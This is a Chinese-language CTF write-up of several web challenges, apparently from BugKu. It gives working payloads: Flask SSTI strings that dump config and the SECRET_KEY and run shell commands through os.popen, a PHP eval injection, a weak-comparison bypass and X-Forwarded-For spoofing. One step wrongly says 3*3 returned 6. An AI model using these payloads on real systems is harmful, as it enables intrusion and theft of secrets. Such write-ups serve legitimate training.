## Web

### Simple_SSTI_1

打开场景，提示需要构建一个参数来显示 flag

对于 flask 框架，我么可以使用以下两种方式来显示 flag

1. 显示所有编码，在里面找到 flag：`http://114.67.175.224:13009/?flag={{config.items()}}`
2. 直接显示 flask 开发中经常会用到的变量 SECRET_KEY：`?flag={{ config.SECRET_KEY}}`

<br>

### Simple_SSTI_2

利用 SSTI 漏洞，非法执行代码来获取 flag

首先测试一下是否存在 SSTI 漏洞：`?flag={{3*3}}`  
结果网页返回 6 ，表示存在 SSTI 漏洞

然后通过以下固定代码获取系统文件夹内容：  
`?flag={{ config.__class__.__init__.__globals__['os'].popen('ls ../').read() }}`

然后使用 ls 逐步勘察可能存在 flag 的文件夹，最终定位，使用 cat 查看对应文件就可以找到 flag 了！！！  
`{{%20config.__class__.__init__.__globals__[%27os%27].popen(%27cat%20../app/flag%27).read()%20}}`

<br>

### 矛盾

> 考察 php 弱类型比较

根据以下代码得出结论，当传入的参数 num 的值不是数字且不等于 1 时，可以得到 flag

```php
$num=$_GET['num'];
if(!is_numeric($num))
{
echo $num;
if($num==1)
echo 'flag{**********}';
}
```

所以可以直接使用 1 和一对方括号来解决：`?num=1[]`

<br>

### 你必须让他停下

> 考察开发者工具的简单调试

下面是几个常见的调试操作：

1. F12 打开开发者工具，直接就可以看到 flag
2. 开发者工具修改网页内容，解除某些限制（如可输入文本长度等）
3. 有可能 flag 伪装成注释放在了 html 里面，注意看

<br>

### 本地管理员

> XXF 伪造

打开场景，F12 查看源码，发现有一段 base64 编码文本，将其解码后得到密码：`test123`

发现直接在场景输入账号 admin 加上密码登录是行不通的，IP 被拦截，此时需要 XXF 伪造地址

打开 BP，开启拦截，输入账号密码后点击登录，自动弹出 intercept 界面  
将源码发送到 repeater 里面去

打开 repeater，在源码添加 XXF 伪造：`X-Forwarded-For: 127.0.0.1`  
然后 send，即可得到 flag

<br>

### eval

> php 使用 eval 伪造

```php
<?php
    include "flag.php";
    $a = @$_REQUEST['hello'];
    eval( "var_dump($a);");
    show_source(__FILE__);
?>
```

当提供一个 hello 参数并附带文件 `flag.php` 即可得到结果

构造 URL：`?hello=file('flag.php')`

<br>

###
